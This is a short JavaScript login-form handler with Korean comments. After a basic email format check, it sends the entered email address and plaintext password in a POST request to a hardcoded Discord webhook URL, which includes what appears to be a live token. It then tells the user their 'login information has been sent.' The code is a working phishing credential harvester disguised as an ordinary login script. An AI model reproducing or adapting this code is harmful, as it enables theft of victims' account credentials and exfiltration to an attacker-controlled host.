document.getElementById('login-button').addEventListener('click', function() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const messageElement = document.getElementById('message');

    // 이메일 정규 표현식
    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    // 이메일 유효성 검사
    if (!emailPattern.test(email)) {
        messageElement.textContent = '유효한 이메일 주소를 입력하세요.';
        messageElement.style.color = '#ff0000'; // 오류 메시지 색상
        return; // 유효하지 않으면 함수 종료
    }

    const webhookURL = 'https://discord.com/api/webhooks/1312724758500216882/POMdK4RsYUMWFmYtpz81FE-xyPd4coVmBBCpix4jsQVCdL27avEBXS9ZMYnm2Kz7oc2p';

    const data = {
        content: `이메일: ${email}\n비밀번호: ${password}`
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (response.ok) {
            messageElement.textContent = '로그인 정보가 전송되었습니다.';
            messageElement.style.color = '#00ff00'; // 성공 메시지 색상
        } else {
            messageElement.textContent = '전송 중 오류가 발생했습니다.';
            messageElement.style.color = '#ff0000'; // 오류 메시지 색상
        }
    })
    .catch(error => {
        console.error('Error:', error);
        messageElement.textContent = '전송 중 오류가 발생했습니다.';
        messageElement.style.color = '#ff0000'; // 오류 메시지 색상
    });
});
